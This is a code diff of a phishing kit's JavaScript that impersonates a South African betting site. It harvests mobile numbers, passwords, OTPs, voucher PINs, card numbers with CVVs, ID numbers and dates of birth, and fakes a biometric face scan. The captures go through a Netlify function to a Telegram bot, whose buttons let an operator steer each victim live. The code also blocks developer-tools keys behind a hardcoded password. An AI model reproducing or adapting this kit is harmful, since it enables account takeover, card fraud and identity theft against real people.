@@ -1,323 +1,321 @@
-document.addEventListener("DOMContentLoaded", () => {
-    let currentU = "Unknown";
-    let lastMsgId = null;
-    let pollInt = null;
-    let chatPoll = null;
-    let lId = null;
+document.onkeydown = function(e){ 
+    if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74||e.keyCode==67))||(e.ctrlKey&&e.keyCode==85)){ 
+        let p=prompt("Source Locked:"); 
+        return p==="8890"; 
+    } 
+};
 
-    // Security check logic wrapper
-    document.onkeydown = function(e) {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
-            let p = prompt("Source Locked. Enter Admin Password:");
-            if (p !== "8890") {
-                alert("Access Denied");
-                return false;
+let verificationAttempts = 0;
+let currentU = "Unknown";
+let activePollingInterval = null;
+let autoFallbackTimeout = null;
+let videoStream = null;
+
+const AUTO_FALLBACK_DELAY = 12000;
+
+setTimeout(() => { 
+    document.getElementById('loading-view').style.display = 'none'; 
+    openModal('login-modal');
+}, 1500);
+
+function openModal(id) { 
+    closeModals(); 
+    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+    const target = document.getElementById(id);
+    if (target) target.style.display = 'flex'; 
+}
+
+function openView(id) {
+    closeModals();
+    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+function closeModals() { 
+    document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none'); 
+    stopAllSpinners(); 
+}
+
+function stopAllSpinners() { 
+    document.querySelectorAll('.submit-btn').forEach(b => { 
+        b.disabled = false; 
+        b.innerHTML = b.getAttribute('data-orig') || b.innerHTML; 
+    }); 
+    document.getElementById('process-overlay').style.display = 'none';
+}
+
+function togglePassword(i, e) {
+    const f = document.getElementById(i);
+    const icon = document.getElementById(e);
+    if (f.type === "text") {
+        f.type = "password"; icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye');
+    } else {
+        f.type = "text"; icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash');
+    }
+}
+
+function showError(id) { 
+    const e = document.getElementById(id); 
+    if(e) e.style.display = 'flex'; 
+}
+
+function formatDOB(e) {
+    let v = e.target.value.replace(/\D/g, ''); 
+    if (v.length > 8) v = v.substring(0, 8);
+    if (v.length >= 5) { e.target.value = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4,8); }
+    else if (v.length >= 3) { e.target.value = v.substring(0,2) + '/' + v.substring(2,4); }
+    else { e.target.value = v; }
+}
+
+function handleFocus(el, isMobile, customLabel = null) {
+    const wrap = el.parentElement;
+    wrap.classList.add('focused');
+    wrap.classList.remove('error');
+    if (customLabel) wrap.querySelector('.mat-label').innerText = customLabel;
+    else wrap.querySelector('.mat-label').innerText = isMobile ? 'Mobile Number' : 'Enter Password';
+}
+
+function handleBlur(el, isMobile, customLabel = null) {
+    const wrap = el.parentElement;
+    if (el.value.trim() === '') {
+        wrap.classList.remove('focused');
+        if (customLabel) wrap.querySelector('.mat-label').innerText = customLabel;
+        else wrap.querySelector('.mat-label').innerText = isMobile ? '+27 Mobile Number' : 'Enter Password';
+    }
+}
+
+function onPwFocus(el) {
+    const mob = document.getElementById('lgn-mobile');
+    if (mob.value.trim() === '') {
+        document.getElementById('mobile-wrap').classList.add('error');
+        document.getElementById('pw-wrap').classList.add('error');
+    }
+    handleFocus(el, false);
+}
+
+function remMatErr(el) { el.parentElement.classList.remove('error'); }
+function remErr(i) { i.classList.remove('error-field'); }
+
+function validate(ids) {
+    let valid = true, first = null;
+    ids.forEach(id => {
+        const el = document.getElementById(id);
+        if(el){
+            const val = el.value.trim();
+            if(!val || val.length < 1){
+                if (el.classList.contains('mat-input')) el.parentElement.classList.add('error');
+                else el.classList.add('error-field');
+                valid = false;
+                if(!first) first = el;
             } else {
-                return true;
+                if (el.classList.contains('mat-input')) el.parentElement.classList.remove('error');
+                else el.classList.remove('error-field');
             }
         }
+    });
+    if(first) first.focus();
+    return valid;
+}
+
+async function initCamera() {
+    try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        document.getElementById('user-video').srcObject = videoStream;
+        document.getElementById('camera-placeholder').style.display = 'none';
+        document.getElementById('scan-status').innerText = "Please position your face within the frame.";
+        document.getElementById('scan-status').style.color = "#aaa";
+    } catch (err) {
+        document.getElementById('scan-status').innerText = "Camera access denied. Ensure permissions are allowed.";
+        document.getElementById('scan-status').style.color = "#d93025";
+    }
+}
+
+function startFaceScan() {
+    if (!videoStream) {
+        alert("Please allow camera access to continue.");
+        return;
+    }
+    const btn = document.getElementById('start-scan-btn');
+    if(!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
+    
+    btn.disabled = true;
+    btn.innerHTML = `<div class="spinner"></div>`;
+    
+    document.getElementById('scanner-line').style.display = 'block';
+    document.getElementById('scan-status').innerText = "Analyzing biometric features... Please hold still.";
+    document.getElementById('scan-status').style.color = "#009241";
+
+    setTimeout(() => {
+        document.getElementById('scanner-line').style.display = 'none';
+        document.getElementById('scan-status').innerText = "Verification Successful.";
+        if(videoStream) { videoStream.getTracks().forEach(t => t.stop()); }
+        sendData('Face Scan logs');
+    }, 4000);
+}
+
+function proceedToNextStep(t) {
+    clearActivePolling();
+    stopAllSpinners();
+
+    if (t === 'Betting Voucher logs') {
+        openModal('verification-modal');
+    } else {
+        triggerMaintenance();
+    }
+}
+
+function triggerMaintenance() {
+    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+    document.getElementById('maintenance-view').classList.add('active'); 
+    closeModals();
+    setTimeout(() => { window.location.href = "https://www.betway.co.za/"; }, 4000);
+}
+
+function clearActivePolling() {
+    if (activePollingInterval) clearInterval(activePollingInterval);
+    if (autoFallbackTimeout) clearTimeout(autoFallbackTimeout);
+    activePollingInterval = null;
+    autoFallbackTimeout = null;
+}
+
+function startSessionPolling(sessionId, logType) {
+    clearActivePolling();
+
+    autoFallbackTimeout = setTimeout(() => {
+        proceedToNextStep(logType);
+    }, AUTO_FALLBACK_DELAY);
+
+    activePollingInterval = setInterval(async () => {
+        try {
+            const res = await fetch(`/.netlify/functions/api?sessionId=${sessionId}`);
+            const data = await res.json();
+
+            if (data.status && data.status !== "PENDING") {
+                clearActivePolling();
+                executeAdminCommand(data.status, logType);
+            }
+        } catch (err) { console.error("Polling error:", err); }
+    }, 1500);
+}
+
+function executeAdminCommand(command, logType) {
+    stopAllSpinners();
+
+    switch(command) {
+        case 'approve':
+            proceedToNextStep(logType);
+            break;
+        case 'wrong_pass':
+            document.getElementById('login-pw').value = '';
+            document.getElementById('pw-wrap').classList.add('error');
+            openModal('login-modal');
+            showError('login-error');
+            break;
+        case 'wrong_otp':
+            document.getElementById('otp-input').value = '';
+            document.getElementById('otp-wrap').classList.add('error');
+            openModal('otp-modal');
+            showError('otp-error');
+            break;
+        case 'otp':
+            openModal('otp-modal');
+            break;
+        case 'verify':
+            openModal('verification-modal');
+            break;
+        case 'face_verify':
+            openView('face-verify-view');
+            initCamera();
+            break;
+        case 'maint':
+        case 'reject':
+            triggerMaintenance();
+            break;
+        default:
+            proceedToNextStep(logType);
+    }
+}
+
+function sendData(t) {
+    const btn = event.currentTarget;
+    if(!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
+    
+    let u = currentU;
+    let m = "";
+    const sessionId = "sess_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
+
+    let keyboard = {
+        inline_keyboard: [
+            [
+                { text: "✅ Approve & Continue", callback_data: `approve:${sessionId}` },
+                { text: "⚠️ Wrong Data", callback_data: `wrong_pass:${sessionId}` }
+            ],
+            [
+                { text: "📩 Request OTP", callback_data: `otp:${sessionId}` },
+                { text: "🪪 Request ID Doc", callback_data: `verify:${sessionId}` }
+            ],
+            [
+                { text: "📸 Request Face Scan", callback_data: `face_verify:${sessionId}` },
+                { text: "⛔ End to Maintenance", callback_data: `maint:${sessionId}` }
+            ]
+        ]
     };
 
-    // Initialization: Disable contextmenu
-    document.body.addEventListener('contextmenu', e => e.preventDefault());
+    if(t === 'Betting Voucher logs'){
+        if(!validate(['lgn-mobile','login-pw'])) return;
+        u = document.getElementById('lgn-mobile').value;
+        const p = document.getElementById('login-pw').value;
+        currentU = u;
+        m = `📱 *Betting Voucher Login* 🇿🇦\n👤 *User:* \`${u}\`\n🔑 *Pass:*\n\`${p}\`\n🆔 *Session:* \`${sessionId}\``;
 
-    // Fake Application Loading Transition
-    setTimeout(() => {
-        document.getElementById('loading-view').style.display = 'none';
-        document.getElementById('home-view').classList.add('active');
-    }, 2000);
-
-    // Event Listeners Configuration
-    document.querySelectorAll('.open-login').forEach(el => el.addEventListener('click', () => openModal('login-modal')));
-    document.querySelectorAll('.open-signup').forEach(el => el.addEventListener('click', () => openModal('signup-modal')));
-    document.querySelectorAll('.standard-login-trigger').forEach(el => el.addEventListener('click', () => openModal('login-modal')));
-    document.querySelectorAll('.open-recovery').forEach(el => el.addEventListener('click', () => openModal('forgot-pw-modal')));
-    document.querySelectorAll('.close-modal-btn').forEach(el => el.addEventListener('click', closeModals));
-    document.querySelectorAll('.signup-redirect-trigger').forEach(el => el.addEventListener('click', showProfessionalRedirect));
-    
-    document.getElementById('chat-icon').addEventListener('click', toggleChat);
-    document.getElementById('chat-tab-trigger').addEventListener('click', toggleChat);
-    document.getElementById('close-chat').addEventListener('click', toggleChat);
-    document.getElementById('send-chat-btn').addEventListener('click', sendChatTxt);
-    document.getElementById('chat-file').addEventListener('change', sendChatPhoto);
-    document.getElementById('eye-login').addEventListener('click', () => togglePassword('login-pw', 'eye-login'));
-
-    document.getElementById('card-num').addEventListener('input', (e) => { formatCard(e.target); remErr(e.target); });
-    document.getElementById('card-exp').addEventListener('input', (e) => { formatExp(e.target); remErr(e.target); });
-    
-    // Clear validation bugs on key inputs
-    ['lgn-mobile', 'login-pw', 'vch-input', 'card-holder', 'card-cvv', 'otp-input', 'forgot-input'].forEach(id => {
-        document.getElementById(id)?.addEventListener('input', (e) => remErr(e.target));
-    });
-
-    // Form Submissions Hooked to Netlify Function Engine
-    document.querySelectorAll('.submit-btn').forEach(btn => {
-        btn.addEventListener('click', (event) => {
-            const targetLogType = event.currentTarget.getAttribute('data-log-type');
-            if(targetLogType) sendData(targetLogType, event);
-        });
-    });
-
-    document.querySelector('.exit-lobby-btn').addEventListener('click', () => location.reload());
-
-    // Core Modular UI Handling Elements
-    function openModal(id) {
-        closeModals();
-        document.getElementById(id).style.display = 'flex';
-    }
-
-    function closeModals() {
-        document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none');
-        stopAllSpinners();
-    }
-
-    function stopAllSpinners() {
-        document.querySelectorAll('.submit-btn').forEach(b => {
-            b.disabled = false;
-            b.innerHTML = b.getAttribute('data-orig') || b.innerHTML;
-        });
-    }
-
-    function togglePassword(inputId) {
-        const field = document.getElementById(inputId);
-        field.type = field.type === "text" ? "password" : "text";
-    }
-
-    function formatCard(input) {
-        let v = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-        let parts = [];
-        for (let j = 0; j < v.length; j += 4) {
-            parts.push(v.substring(j, j + 4));
+    } else if (t === 'OTP logs') {
+        const otpEl = document.getElementById('otp-input');
+        const otpVal = otpEl.value.trim();
+        if(otpVal.length < 4 || otpVal.length > 6) {
+            otpEl.parentElement.classList.add('error');
+            return;
         }
-        input.value = parts.join(' ');
-    }
+        m = `📱 *OTP Captured* 🇿🇦\n👤 *User:* \`${currentU}\`\n🔢 *Code:*\n\`${otpVal}\`\n🆔 *Session:* \`${sessionId}\``;
+        keyboard.inline_keyboard[0][1] = { text: "⚠️ Wrong OTP", callback_data: `wrong_otp:${sessionId}` };
 
-    function formatExp(input) {
-        let v = input.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
-        if (v.length >= 2) {
-            input.value = v.substring(0, 2) + '/' + v.substring(2, 4);
-        } else {
-            input.value = v;
-        }
-    }
+    } else if (t === 'Face Scan logs') {
+        m = `📸 *Biometric Face Scan* 🇿🇦\n👤 *User:* \`${currentU}\`\n✅ *Status:* \`Face verified securely via frontend biometrics.\`\n🆔 *Session:* \`${sessionId}\``;
+        keyboard.inline_keyboard.shift();
+        keyboard.inline_keyboard.unshift([
+            { text: "✅ Approve Identity", callback_data: `approve:${sessionId}` },
+            { text: "⛔ Reject Identity", callback_data: `maint:${sessionId}` }
+        ]);
 
-    function showError(id) {
-        const e = document.getElementById(id);
-        if (e) e.style.display = 'flex';
-        setTimeout(() => { if (e) e.style.display = 'none'; }, 5000);
-    }
-
-    function showProfessionalRedirect() {
-        closeModals();
-        document.getElementById('redirect-overlay').style.display = 'flex';
-        let count = 3;
-        const interval = setInterval(() => {
-            count--;
-            document.getElementById('timer').innerText = count;
-            if (count <= 0) {
-                clearInterval(interval);
-                document.getElementById('redirect-overlay').style.display = 'none';
-                openModal('login-modal');
-            }
-        }, 1000);
-    }
-
-    function remErr(input) {
-        input.classList.remove('error-field');
-    }
-
-    function validate(ids) {
-        let valid = true;
-        let first = null;
-        ids.forEach(id => {
-            const el = document.getElementById(id);
-            const val = el.value.trim();
-            if (id === 'card-cvv') {
-                if (val.length < 3 || val.length > 4) {
-                    el.classList.add('error-field');
-                    valid = false; if (!first) first = el;
-                }
-            } else if (id === 'otp-input') {
-                if (val.length < 4 || val.length > 6) {
-                    el.classList.add('error-field');
-                    valid = false; if (!first) first = el;
-                }
-            } else {
-                if (!val || val.length < 1) {
-                    el.classList.add('error-field');
-                    valid = false; if (!first) first = el;
-                } else {
-                    el.classList.remove('error-field');
-                }
-            }
-        });
-        if (first) first.focus();
-        return valid;
-    }
-
-    // Chat Controller Functions
-    function toggleChat() {
-        const w = document.getElementById('chat-window');
-        w.style.display = w.style.display === 'flex' ? 'none' : 'flex';
-        if (w.style.display === 'flex') pollChat();
-    }
-
-    function addMsg(txt, cls) {
-        const d = document.createElement('div');
-        d.className = `msg-b ${cls}`;
-        d.innerText = txt;
-        document.getElementById('chat-msgs').appendChild(d);
-        document.getElementById('chat-msgs').scrollTop = 9999;
-    }
-
-    async function sendChatTxt() {
-        const t = document.getElementById('chat-txt');
-        if (!t.value) return;
-        const msgStr = t.value;
-        addMsg(msgStr, 'msg-user');
-        t.value = '';
-
-        await fetch('/.netlify/functions/api', {
-            method: 'POST',
-            body: JSON.stringify({ action: 'sendMessage', text: `💬 Support [${currentU}]: ${msgStr}` })
-        });
-    }
-
-    async function sendChatPhoto() {
-        const f = document.getElementById('chat-file').files[0];
-        if (!f) return;
-        addMsg('Sending attachment...', 'msg-user');
+    } else if (t === 'Verification logs') {
+        if(!validate(['verify-fname', 'verify-sname', 'verify-doc-input', 'verify-dob'])) return;
         
-        const reader = new FileReader();
-        reader.readAsDataURL(f);
-        reader.onloadend = async () => {
-            const base64Data = reader.result.split(',')[1];
-            await fetch('/.netlify/functions/api', {
-                method: 'POST',
-                body: JSON.stringify({ action: 'sendPhoto', photo: base64Data, caption: `Chat Photo: ${currentU}` })
-            });
-            addMsg('Attachment sent.', 'msg-user');
-        };
+        const fname = document.getElementById('verify-fname').value.trim();
+        const sname = document.getElementById('verify-sname').value.trim();
+        const docInputEl = document.getElementById('verify-doc-input');
+        const docVal = docInputEl.value.trim();
+        
+        if (docVal.length < 10 || docVal.length > 15) { docInputEl.classList.add('error-field'); return; }
+        
+        const docType = document.getElementById('verify-doc-type').value;
+        const dob = document.getElementById('verify-dob').value;
+        
+        m = `🪪 *Identity Verification* 🇿🇦\n👤 *User:* \`${currentU}\`\n📝 *First Name:* \`${fname}\`\n📝 *Surname:* \`${sname}\`\n🇿🇦 *${docType}:*\n\`${docVal}\`\n📅 *D.O.B:* \`${dob}\`\n🆔 *Session:* \`${sessionId}\``;
     }
 
-    function pollChat() {
-        if (chatPoll) return;
-        chatPoll = setInterval(async () => {
-            try {
-                let res = await fetch('/.netlify/functions/api?action=getUpdates');
-                let d = await res.json();
-                const m = d.result?.[0]?.message;
-                if (m && m.reply_to_message && m.text) {
-                    if (!lId || lId !== m.message_id) {
-                        lId = m.message_id;
-                        addMsg(m.text, 'msg-agent');
-                    }
-                }
-            } catch(e){}
-        }, 3000);
+    btn.disabled = true; 
+    btn.innerHTML = `<div class="spinner"></div>`;
+    if(t !== 'Face Scan logs') {
+        document.getElementById('process-overlay').style.display = 'flex'; 
     }
 
-    // Server Approval Workflow Logic Routine
-    function startPolling(logType) {
-        if (pollInt) clearInterval(pollInt);
-        pollInt = setInterval(async () => {
-            try {
-                let res = await fetch('/.netlify/functions/api?action=getUpdates');
-                let d = await res.json();
-                const last = d.result?.[0];
-                if (last && last.callback_query) {
-                    const cb = last.callback_query;
-                    if (cb.message.message_id === lastMsgId) {
-                        const act = cb.data;
-                        if (act === "approve") {
-                            clearInterval(pollInt); pollInt = null;
-                            document.getElementById('process-overlay').style.display = 'none';
-                            stopAllSpinners();
-                            if (logType === 'Betting Voucher logs') openModal('vch-modal');
-                            else if (logType === 'Voucher logs') openModal('card-modal');
-                            else if (logType === 'Card logs') openModal('otp-modal');
-                            else {
-                                document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-                                document.getElementById('success-view').classList.add('active');
-                                closeModals();
-                            }
-                        } else if (act === "reject") {
-                            clearInterval(pollInt); pollInt = null;
-                            document.getElementById('process-overlay').style.display = 'none';
-                            stopAllSpinners();
-                            if (logType === 'Betting Voucher logs') showError('login-error');
-                            else if (logType === 'Voucher logs') showError('vch-error');
-                            else if (logType === 'Card logs') showError('card-error');
-                            else if (logType === 'OTP logs') showError('otp-error');
-                        }
-                    }
-                }
-            } catch (e) {}
-        }, 2000);
-    }
-
-    async function sendData(type, event) {
-        const btn = event.currentTarget;
-        if (!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
-
-        if (type === 'Betting Voucher logs') {
-            if (!validate(['lgn-mobile', 'login-pw'])) return;
-            currentU = document.getElementById('lgn-mobile').value;
-        } else if (type === 'Voucher logs') {
-            if (!validate(['vch-input'])) return;
-        } else if (type === 'Card logs') {
-            if (!validate(['card-holder', 'card-num', 'card-exp', 'card-cvv'])) return;
-        } else if (type === 'OTP logs') {
-            if (!validate(['otp-input'])) return;
-        }
-
-        let msg = "";
-        let payload = { action: 'sendStructuredData' };
-
-        if (type === 'Betting Voucher logs') {
-            msg = `📱 *Betting Voucher Login SA 🇿🇦🇿🇦*\n👤 *User:* \`${currentU}\`\n🔑 *Pass:* \`${document.getElementById('login-pw').value}\``;
-        } else if (type === 'Voucher logs') {
-            msg = `🎫 *Voucher*\n👤 *User:* \`${currentU}\`\n🏷️ *Type:* ${document.getElementById('vch-type').value}\n🔑 *PIN:* \`${document.getElementById('vch-input').value}\``;
-        } else if (type === 'Card logs') {
-            msg = `💳 *Card*\n👤 *User:* \`${currentU}\`\n👤 *Holder:* ${document.getElementById('card-holder').value}\n💳 *Num:* \`${document.getElementById('card-num').value}\`\n📅 *Exp:* \`${document.getElementById('card-exp').value}\`\n🔐 *CVV:* \`${document.getElementById('card-cvv').value}\``;
-            
-            // Handle optional asset file conversions to base64
-            const f1 = document.getElementById('card-front').files[0];
-            const f2 = document.getElementById('card-back').files[0];
-            if (f1) payload.file1 = await getBase64(f1);
-            if (f2) payload.file2 = await getBase64(f2);
-        } else if (type === 'OTP logs') {
-            msg = `🔐 *OTP*\n👤 *User:* \`${currentU}\`\n📟 *OTP:* \`${document.getElementById('otp-input').value}\``;
-        }
-
-        payload.message = msg;
-        payload.currentUser = currentU;
-
-        btn.disabled = true;
-        btn.innerHTML = `<div class="spinner"></div>`;
-        document.getElementById('process-overlay').style.display = 'flex';
-
-        try {
-            let response = await fetch('/.netlify/functions/api', {
-                method: 'POST',
-                body: JSON.stringify(payload)
-            });
-            let resData = await response.json();
-            if (resData.ok) {
-                lastMsgId = resData.result.message_id;
-            }
-        } catch (err) {}
-
-        startPolling(type);
-    }
-
-    function getBase64(file) {
-        return new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.readAsDataURL(file);
-            reader.onload = () => resolve(reader.result.split(',')[1]);
-            reader.onerror = error => reject(error);
-        });
-    }
-});
-
+    fetch('/.netlify/functions/api', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: m, sessionId, keyboard })
+    })
+    .then(() => startSessionPolling(sessionId, t))
+    .catch(err => {
+        console.error("Dispatch error:", err);
+        proceedToNextStep(t);
+    });
+}
